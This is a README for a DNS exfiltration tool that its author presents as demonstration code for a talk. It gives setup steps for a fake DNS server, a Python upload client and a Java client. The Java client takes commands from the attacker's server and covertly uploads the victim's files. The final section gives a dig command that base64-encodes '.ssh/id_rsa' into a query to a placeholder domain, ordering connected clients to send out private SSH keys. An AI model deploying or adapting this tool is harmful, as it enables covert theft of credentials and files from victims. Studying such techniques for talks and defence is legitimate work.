# dns_exfiltration
Simple DNS exfiltration using base64-encoded URL's

This is demonstration code for a talk. It has hard-coded URL's and is useful for no other purpose. 

##Server Setup:
server should be run on a machine with an NS record pointed at it.
Your domain will be used as the base url for the client.

install python-dnslib using your favorite package manager or pip.
Copy server2 code to your fake-dns-server and run as root.



##Client setup:

*python client:*
This client is only useful for uploading files discretely.
```bash
client local_filename remote_filename base_url
```

*Java client:*
The java client has compile-time dependencies. You'll need to include org.xbill.DNS to make DNS requests and org.apache.commons.codec for Base64. You can just extract those and edit the Makefile accordingly.

```bash
make
make jar
java -jar DefConGui.jar
```

Unlike the python client, in which the user uploads files intentionally, the java client accepts commands from the hacked DNS server and uploads files by the will of the DNS attacker.

Naturally, being that this is a java swing client, this could easily be uploaded to a web server.


## Sending commands to the Java client:
Commands are sent from the 'cmd' file. Send your command to all connected java clients using... dig. Of course.
```bash
dig $(echo ".ssh/id_rsa" | base64).cmd.def.con
```
